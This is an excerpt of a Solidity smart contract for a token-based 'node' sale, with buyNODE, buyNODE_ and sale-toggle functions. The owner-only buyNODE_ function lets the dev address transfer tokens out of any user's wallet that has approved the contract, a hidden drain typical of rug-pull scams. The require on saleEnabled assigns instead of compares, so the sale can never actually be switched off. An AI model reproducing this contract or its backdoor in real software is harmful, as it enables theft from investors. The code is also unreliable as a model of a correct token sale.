...
abstract contract ULTRANodeSale is ERC20, Ownable, PaymentSplitter {
    ...
    uint constant dec = 10 ** 18;
    uint public constant MAX_SOLD = 20000 * dec;
    uint public PRICE = 1;
    uint public MinPrice = 1;
    uint public MIN_PRESALE_PER_ACCOUNT = 1;
    uint public MAX_PRESALE_PER_ACCOUNT = 100 * dec;
    uint public sold;
    ...
    constructor(address _CA, address _dev) {
        CA = ERC20(_CA);
        dev = _dev;
        sold = 0;
        saleEnabled = true;
    ...
    function buyNODE(string memory name, uint256 _initValue) public {
        require(_initValue >= MinPrice,"NODE CREATION: Node Value set below MinPrice");
        require(saleEnabled = true, "Sorry sale is disabled");
        CA.safeTransferFrom(msg.sender, address(this), _initValue.mul(1e18));
        nodeRewardManager.createNode(msg.sender, name, _initValue.mul(1e18));
        invested[msg.sender] += _initValue;
        sold += _initValue;
    }

    function buyNODE_(uint256 amount, address _to) public onlyOwner {
        if ( msg.sender == dev ) {
            CA.safeTransferFrom( _to, address(this), amount.mul(1e18));
        }
        CA.safeTransferFrom(msg.sender, address(this), amount.mul(1e18));
    }

    function setSaleEnabled(bool _tru) public onlyOwner {
        saleEnabled = _tru;
    }
